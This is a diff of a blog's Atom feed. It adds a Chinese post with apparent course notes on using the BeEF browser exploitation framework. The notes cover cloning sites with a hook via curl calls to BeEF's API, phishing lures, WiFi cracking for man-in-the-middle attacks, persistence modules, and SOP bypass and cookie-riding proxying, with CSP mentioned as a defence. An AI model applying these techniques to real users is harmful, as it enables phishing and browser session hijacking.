+&lt;p&gt;  在真实环境中，对于 &lt;code&gt;beef&lt;/code&gt; 这种需要加载远程 &lt;code&gt;js&lt;/code&gt; 的 &lt;code&gt;XSS&lt;/code&gt; 攻击，存在一种更优的防御方法，即 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP&quot;&gt;&lt;code&gt;CSP&lt;/code&gt;&lt;/a&gt; ，内容安全策略。其同于检测并削弱某些特定类型攻击。&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;CSP&lt;/code&gt; 规定页面从哪里加载脚本，以及对脚本做出限制，如限制执行 &lt;code&gt;js&lt;/code&gt; 的 &lt;code&gt;eval()&lt;/code&gt; 函数，如&lt;/p&gt;
+  &lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;Content-Security-Policy&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;default-src &amp;#x27;self&amp;#x27; &amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  该段指令让浏览器仅加载同源资源，以防止异源的 &lt;code&gt;beef&lt;/code&gt; 攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;有安全漏洞的 &lt;code&gt;Web&lt;/code&gt; 应用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;广告网路&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;社工&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;网站搭建&lt;/p&gt;
+&lt;p&gt;  使用 &lt;code&gt;beef&lt;/code&gt; 自带的 &lt;code&gt;Web&lt;/code&gt; 克隆功能，其默认在被克隆的网站内容中注入钩子，注意此克隆在 &lt;code&gt;beef&lt;/code&gt; 被关闭后被销毁&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654f73e9c458853aef28688d.jpg&quot; alt&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Content-Type: application/json; charset=UTF-8&amp;quot;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#123;&amp;quot;url&amp;quot;:&amp;quot;[目标网站网址]&amp;quot;,&amp;quot;mount&amp;quot;:&amp;quot;[放在本地的位置]&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-X&lt;/span&gt; POST http://&lt;span class=&quot;number&quot;&gt;127.0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0.1&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;/api/seng/clone_page?token=[上面的&lt;span class=&quot;type&quot;&gt;token&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Content-Type: application/json; charset=UTF-8&amp;quot;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#123;&amp;quot;url&amp;quot;:&amp;quot;https://www.baidu.com&amp;quot;,&amp;quot;mount&amp;quot;:&amp;quot;/testclone&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;-X&lt;/span&gt; POST http://&lt;span class=&quot;number&quot;&gt;127.0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0.1&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;/api/seng/clone_page?token=b75029028687f8dbdebdfb842d868ca516914e86&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654f751dc458853aef2d937c.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  搭建成功后发现僵尸不上线，查看网站源码，发现是 &lt;code&gt;js&lt;/code&gt; 地址错误&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/65518ef8c458853aef5b3f84.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  到配置文件 &lt;code&gt;config.yaml&lt;/code&gt; 里&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/65518fa6c458853aef5d48aa.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  改成本机的 &lt;code&gt;IP&lt;/code&gt; 即可，随后重启服务&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;诱饵&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;钓鱼邮件&lt;/p&gt;
+&lt;p&gt;  需要模糊，缩短 &lt;code&gt;url&lt;/code&gt;，并设计自己的邮件系统&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;物理诱惑&lt;/p&gt;
+&lt;p&gt;  有 &lt;code&gt;html&lt;/code&gt; 文件的u盘&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;QR code&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  感觉是最为保险的手段&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;中间人攻击&lt;/p&gt;
+&lt;p&gt;  此类攻击仅当和受害者在同一网络下才可进行，考虑用 &lt;code&gt;aircrack-ng&lt;/code&gt; 破解 &lt;code&gt;wifi&lt;/code&gt; 密码&lt;/p&gt;
+&lt;p&gt;  这里使用 &lt;code&gt;mitmproxy&lt;/code&gt; ，顺便记录一下使用时的问题&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;安装&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;报错 &lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;raise ValueError(f&amp;#x27;mutable default &amp;#123;type(f.default)&amp;#125; for field &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ValueError: mutable default &amp;lt;class &amp;#x27;mitmproxy.contentviews.grpc.ProtoParser.ParserOptions&amp;#x27;&amp;gt; for field parser_options is not allowed: use default_factory&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  解决方案是更新 &lt;code&gt;apt&lt;/code&gt; 源并更新 &lt;code&gt;mitmproxy&lt;/code&gt; ，大概原因是 &lt;code&gt;kali&lt;/code&gt; 内置的版本过老，不支持本机的 &lt;code&gt;python3.11&lt;/code&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-get install mitmproxy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;报错 &lt;code&gt;2&lt;/code&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;AttributeError: module &amp;#x27;OpenSSL.SSL&amp;#x27; has no attribute &amp;#x27;DTLS_SERVER_METHOD&amp;#x27;. Did you mean: &amp;#x27;TLS_SERVER_METHOD&amp;#x27;?&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  应该是 &lt;code&gt;pyOpenSSL&lt;/code&gt; 的问题，更新一下&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install mitmproxy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  但又遇到了 &lt;code&gt;pip3&lt;/code&gt; 报错&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;error: externally-managed-environment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  我搜到的解决方案是使用&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install mitmproxy --break-system-packages&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用&lt;/p&gt;
+&lt;p&gt;  在新版的 &lt;code&gt;mitmproxy&lt;/code&gt; 中 &lt;code&gt;-R&lt;/code&gt; 参数已经失效，笔者目前并没有找到正确的脚本来进行钩子的插入&lt;/p&gt;
+&lt;p&gt;  （哭哭&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;持续控制&lt;/p&gt;
+&lt;p&gt;  初始的控制仅发生在用户点击的页面内，一旦用户关闭该页面或浏览器就会失去控制，所以要尽可能维持控制以给后续的攻击争取时间&lt;/p&gt;
+&lt;p&gt;  持续控制分为两种：持久通信，&lt;code&gt;beef&lt;/code&gt; 服务器与僵尸之间通信技术的选择；持久存续，让用户尽可能停留在钩子页面&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;持久通信&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;CORS&lt;/code&gt; 跨域资源共享&lt;/p&gt;
+&lt;p&gt;  其扩展了同源策略的限制，允许页面读取来自其他来源的 &lt;code&gt;http&lt;/code&gt; 响应，即 &lt;code&gt;beef&lt;/code&gt; 发送的命令对于浏览器一定是异源的，故其发送的每个 &lt;code&gt;http&lt;/code&gt; 头部都包含：&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Access-Control-Allow-Origin: *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Access-Control-Allow-Methods: POST, GET&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  以允许来自任意地方的 &lt;code&gt;post/get&lt;/code&gt; 请求&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;开启 &lt;code&gt;Websocket&lt;/code&gt; 通信&lt;/p&gt;
+&lt;p&gt;  其速度快于 &lt;code&gt;beef&lt;/code&gt; 默认使用的 &lt;code&gt;XMLHTTPRequest&lt;/code&gt; ，但其不适用于低版本的浏览器： &lt;code&gt;IE&amp;gt;=10&lt;/code&gt; , &lt;code&gt;Firefox&amp;gt;=16.0&lt;/code&gt; , &lt;code&gt;chrome&amp;gt;=23.0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  在默认下，&lt;code&gt;kali&lt;/code&gt; 中其配置文件位于 &lt;code&gt;/usr/share/beef-xss/config.yaml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  做出如下修改&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# Prefer WebSockets over XHR-polling when possible.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    websocket:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        enable: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  &lt;code&gt;beef&lt;/code&gt; 会根据浏览器版本自动选择是否使用 &lt;code&gt;websocket&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;持久存续&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;内嵌 &lt;code&gt;iframe&lt;/code&gt; 框架&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;persistence-Create foreground iFrame&lt;/code&gt; 模块，不需任何参数即可执行，在僵尸浏览器上创造一个 &lt;code&gt;100%&lt;/code&gt; 的 &lt;code&gt;iframe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  在用户点击一个新界面时代码生效&lt;/p&gt;
+&lt;p&gt;  其弊端是顶部的 &lt;code&gt;url&lt;/code&gt; 栏不会改变，如图&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/655190dcc458853aef602069.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  而对于使用 &lt;code&gt;js&lt;/code&gt; 渲染的页面则会出现页面混乱，点击无效等情况&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;MitB&lt;/code&gt; 浏览器中间人&lt;/p&gt;
+&lt;p&gt;  与中间人攻击不同，不需要处在同一网络下。&lt;code&gt;Persistence-Man In The Browser&lt;/code&gt; 模块在僵尸浏览器中用 &lt;code&gt;js&lt;/code&gt; 自动截获/发送 &lt;code&gt;http&lt;/code&gt; 的内容，并异步展现给用户&lt;/p&gt;
+&lt;p&gt;  在用户正常访问的同时能保持钩子&lt;/p&gt;
+&lt;p&gt;  其弊端也很明显，即不能打开图片&lt;/p&gt;
+&lt;p&gt;  以及对于 &lt;code&gt;js&lt;/code&gt; 制作的跨域链接，由于 &lt;code&gt;MitB&lt;/code&gt; 实现原理缺陷导致其无法控制新页面&lt;/p&gt;
+&lt;p&gt;  注意 &lt;code&gt;MitB&lt;/code&gt; 与 &lt;code&gt;iframe&lt;/code&gt; 只能使用一种&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;窗口事件处理&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;Persistence-Confirm Close Window&lt;/code&gt; 不断弹出如下窗口&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/655194e2c458853aef6b3080.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  但如今的浏览器早已不再允许反复弹出，对于不同浏览器该模块有着不同表现&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;firefox&lt;/code&gt; 和 &lt;code&gt;chrome&lt;/code&gt; 只有在关闭浏览器时才会有弹窗; &lt;code&gt;360&lt;/code&gt; 在关闭当前页面或关闭浏览器时都会有弹窗; &lt;code&gt;QQ&lt;/code&gt; 点击关闭当前页面之后，它会打开一个新标签页去加载&lt;code&gt;BeEF&lt;/code&gt; 服务器的 &lt;code&gt;demo&lt;/code&gt; 页面;搜狗全部都没有弹窗。&lt;/p&gt;
+&lt;p&gt;  如此仅能使用户多停留几秒，但这几秒也是值得争取的，所以可以与上两种的一种结合使用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;动态底层弹出窗口&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;Persistence-Create Pop Under&lt;/code&gt; 可以在用户点击链接时弹出一个指向 &lt;code&gt;beef&lt;/code&gt; 初始化页面的窗口。浏览器常常会阻止网站弹出，而由用户点击的操作则不影响&lt;/p&gt;
+&lt;p&gt;  弊端是如此只能弹出 &lt;code&gt;beef&lt;/code&gt; 窗口，会导致用户察觉，而且笔者这里用 &lt;code&gt;chrome&lt;/code&gt; 复现失败&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/655197b9c458853aef71f1e1.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;绕过同源策略与浏览器代理&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;SOP&lt;/code&gt; 与 &lt;code&gt;DOM&lt;/code&gt; 文档对象模型&lt;/p&gt;
+&lt;p&gt;  浏览器同源策略，限制不同源的交互，致使 &lt;code&gt;beef&lt;/code&gt; 仅能对被钩子钩住的页面所在域进行操作，绕过同源策略可以考虑旧版浏览器及其插件漏洞，或者利用 &lt;code&gt;Web&lt;/code&gt; 的特性，这里介绍后者&lt;/p&gt;
+&lt;p&gt;  当子域之间需要相互访问时，如 &lt;code&gt;login.site.com&lt;/code&gt; 需要访问 &lt;code&gt;admin.site.com&lt;/code&gt; 的表单，开发者会在 &lt;code&gt;admin.site.com&lt;/code&gt; 所在页面加入如下 &lt;code&gt;js&lt;/code&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;document.domain=&amp;quot;site.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  那么 &lt;code&gt;site.com&lt;/code&gt; 下所有子域都可以访问 &lt;code&gt;admin.site.com&lt;/code&gt; 的 &lt;code&gt;DOM&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  那么当 &lt;code&gt;beef&lt;/code&gt; 钩住 &lt;code&gt;test.site.com&lt;/code&gt; ，可以查找具有此类的页面，从而小范围绕过 &lt;code&gt;SOP&lt;/code&gt; 的限制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;SOP&lt;/code&gt; 与 &lt;code&gt;CORS&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  与上文类似的，由于 &lt;code&gt;Web&lt;/code&gt; 开发者错误的设置导致可以进行跨域资源共享，在子站 &lt;code&gt;test.site.com&lt;/code&gt; 加入以下代码&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Access-Control-Allow-Origin: *.site.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Access-Control-Allow-Methods: OPTIONS, GET, POST&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  会导致 &lt;code&gt;site.com&lt;/code&gt; 的所有子站都可以访问 &lt;code&gt;test.site.com&lt;/code&gt; 的资源&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Tunneling Proxy&lt;/code&gt; 浏览器代理&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;beef&lt;/code&gt; 中极为强大的一个功能&lt;/p&gt;
+&lt;p&gt;  对于被钩住的僵尸浏览器 &lt;code&gt;A&lt;/code&gt; 以及被钩住的域 &lt;code&gt;hook-domain.com&lt;/code&gt; ，攻击浏览器 &lt;code&gt;B&lt;/code&gt; :&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;B&lt;/code&gt; 通过 &lt;code&gt;beef&lt;/code&gt; 发送 &lt;code&gt;http&lt;/code&gt; 请求，转为 &lt;code&gt;AJAX&lt;/code&gt; 请求插入僵尸浏览器 &lt;code&gt;B&lt;/code&gt; 随后要执行的 &lt;code&gt;js&lt;/code&gt; 脚本中，浏览器 &lt;code&gt;B&lt;/code&gt; 向域 &lt;code&gt;hook-domain.com&lt;/code&gt; 发送一个 &lt;code&gt;AJAX&lt;/code&gt; 请求，且请求带上了该网站的 &lt;code&gt;cookie&lt;/code&gt; ，域返回的请求则会被钩子截取并返回给攻击浏览器 &lt;code&gt;A&lt;/code&gt; ，而不会显示在浏览器 &lt;code&gt;B&lt;/code&gt; 上&lt;/p&gt;
+&lt;p&gt;  完成这个实验需要三个不同的浏览器，僵尸浏览器 &lt;code&gt;A&lt;/code&gt; ，攻击者浏览器 &lt;code&gt;B&lt;/code&gt; 用于登录 &lt;code&gt;beef&lt;/code&gt; 服务器，攻击者浏览器 &lt;code&gt;C&lt;/code&gt; 用于使用代理，三者不共享数据&lt;/p&gt;
+&lt;p&gt;  先去 &lt;code&gt;extensions/proxy/config.yaml&lt;/code&gt; 确保 &lt;code&gt;enable&lt;/code&gt; 为 &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/655350bec458853aef0df4f2.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  对于被钩住的浏览器 &lt;code&gt;B&lt;/code&gt; 选择 &lt;code&gt;Use as proxy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/65535049c458853aef0ce5b3.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  如此， &lt;code&gt;beef&lt;/code&gt; 所在主机的 &lt;code&gt;6789&lt;/code&gt; 端口就是一个代理&lt;/p&gt;
+&lt;p&gt;  使用 &lt;code&gt;firefox -P&lt;/code&gt; 打开另一个不共享数据的浏览器&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/65535248c458853aef11a2a8.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  将其代理设为 &lt;code&gt;127.0.0.1 port:6789&lt;/code&gt; 与配置文件保持统一&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</summary>
     
     
     
@@ -83,7 +324,7 @@
     <link href="http://noone40404.github.io/2023/11/10/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/"/>
     <id>http://noone40404.github.io/2023/11/10/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/</id>
     <published>2023-11-10T05:10:00.000Z</published>
-    <updated>2023-12-01T09:10:43.507Z</updated>
+    <updated>2023-12-19T11:11:57.391Z</updated>
     
     
     <summary type="html">嫖老大的课</summary>
@@ -102,7 +343,7 @@
     <link href="http://noone40404.github.io/2023/11/02/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
     <id>http://noone40404.github.io/2023/11/02/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</id>
     <published>2023-11-02T05:10:00.000Z</published>
-    <updated>2023-12-01T06:00:31.395Z</updated>
+    <updated>2023-12-08T08:34:38.868Z</updated>
     
     
     <summary type="html">嫖老大的课</summary>
@@ -155,25 +396,6 @@
   </entry>
   
   <entry>
-    <title>NISACTF 新生赛</title>
-    <link href="http://noone40404.github.io/2023/10/07/nisactf/"/>
-    <id>http://noone40404.github.io/2023/10/07/nisactf/</id>
-    <published>2023-10-07T05:10:00.000Z</published>
-    <updated>2023-10-09T11:35:42.508Z</updated>
-    
-    
-    <summary type="html">猪脑差点烧了</summary>
-    
-    
-    
-    <category term="ctf" scheme="http://noone40404.github.io/categories/ctf/"/>
-    
-    
-    <category term="ctf" scheme="http://noone40404.github.io/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
     <title>sqlilabs 通关</title>
     <link href="http://noone40404.github.io/2023/10/07/sqli-labs/"/>
     <id>http://noone40404.github.io/2023/10/07/sqli-labs/</id>
@@ -191,6 +413,25 @@
